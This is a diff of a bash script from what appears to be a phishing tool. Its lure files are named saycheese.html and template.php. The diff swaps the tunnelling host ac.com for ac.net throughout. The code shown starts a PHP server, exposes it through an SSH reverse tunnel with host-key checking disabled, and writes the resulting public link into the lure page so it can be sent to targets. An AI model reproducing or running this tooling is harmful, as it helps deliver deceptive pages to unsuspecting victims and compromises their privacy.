@@ -93,7 +93,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting ac.com...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting ac.net...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -101,11 +101,11 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 ac.com 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 ac.net 2> /dev/null > sendlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 ac.com 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 ac.net 2> /dev/null > sendlink ' &
 
 sleep 8
 fi
@@ -113,7 +113,7 @@ printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.ac.com" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.ac.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
@@ -184,7 +184,7 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m ac.com\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m ac.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
@@ -208,7 +208,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.ac.com" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.ac.net" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
